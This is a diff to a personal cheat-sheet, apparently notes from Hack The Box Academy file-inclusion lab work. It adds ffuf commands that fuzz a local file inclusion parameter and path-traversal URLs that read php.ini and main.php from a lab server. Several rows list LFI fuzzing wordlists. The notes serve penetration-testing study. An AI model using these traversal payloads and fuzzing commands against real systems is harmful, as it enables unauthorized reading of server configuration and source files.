@@ -81,6 +81,7 @@
 | `ffuf -c -ic -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value'` | Fuzz page for undocumented web parameters using [FFUF Automated Scanning](https://academy.hackthebox.com/module/23/section/1494) |
 | `ffuf -w /usr/share/seclists/Fuzzing/XSS/XSS-With-Context-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ'` | Fuzz LFI payloads with [LFI wordlists](https://academy.hackthebox.com/module/23/section/1494) |
 | `ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287` | Fuzz webroot path |
+| `ffuf -c -ic -w drtychai-lfi-wordlist.txt:FUZZ -u 'http://94.237.49.11:53690/ilf_admin/index.php?log=../../../../../../../..FUZZ' -fs 2046 -replay-proxy http://127.0.0.1:8080` | FFUF via proxy an identified LFI injection web paramenter with the wordlist drtychai lfi. |
 | `ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287` | Fuzz server configurations |
 | [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) | SecLists Fuzzing LFI |
 | [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) |
@@ -178,6 +179,8 @@ cat index.php | grep -ie 'Admin'
 
 
 
-ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://83.136.252.24:46462/fuzz.php'
 
-ffuf -c -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://83.136.252.24:46462/FUZZ.php
+http://94.237.49.11:53690/ilf_admin/index.php?log=../../../../../../../../etc/php/7.3/fpm/php.ini
+
+
+http://94.237.49.11:53690/ilf_admin/index.php?log=../../../../../../../../../../var/www/html/main.php
